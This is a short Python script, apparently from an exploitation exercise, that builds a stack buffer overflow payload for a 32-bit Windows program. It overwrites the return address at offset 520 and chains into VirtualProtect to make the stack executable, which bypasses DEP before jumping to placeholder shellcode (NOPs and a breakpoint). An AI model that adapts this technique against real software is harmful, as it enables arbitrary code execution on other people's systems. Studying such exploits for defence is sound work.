from util import *

import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
BIN_PATH = os.path.join(BASE_DIR, "test.bin")

SHELL_CODE = b"\x90\x90\x90\x90\xcc"  # NOP x4 + INT3

STACK_BASE = 0x19FD14
RET_OVERWRITE_OFFSET = 520

# VirtualProtect API
# https://learn.microsoft.com/ja-jp/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
# BOOL VirtualProtect(
#   [in]  LPVOID lpAddress,
#   [in]  SIZE_T dwSize,
#   [in]  DWORD  flNewProtect,
#   [out] PDWORD lpflOldProtect
# );
VP_ADDR = 0x75AE0B60  # exec "? KERNEL32!VirtualProtectStub" in WinDbg
VP_LP_ADDRESS = STACK_BASE
VP_DW_SIZE = len(SHELL_CODE)
VP_NEW_PROTECT = 0x40  # PAGE_EXECTE_READ_WRITE
VP_OLD_PROTECT = STACK_BASE + len(SHELL_CODE)  # padding


def generate_payload() -> bytes:
    payload = b""
    payload += SHELL_CODE
    payload += b"B" * (RET_OVERWRITE_OFFSET - len(SHELL_CODE))  # padding
    payload += le32(VP_ADDR)  # exec first and jump to VirtualProtect
    payload += le32(STACK_BASE)  # jump to shell code top by VirtualProtect ret
    payload += le32(VP_LP_ADDRESS)
    payload += le32(VP_DW_SIZE)
    payload += le32(VP_NEW_PROTECT)
    payload += le32(VP_OLD_PROTECT)

    return payload


def main():
    print(f"Writing to: {BIN_PATH}")

    payload = generate_payload()
    print(f"Payload size: {len(payload)}B")

    with open(BIN_PATH, "wb") as f:
        f.write(payload)


if __name__ == "__main__":
    main()
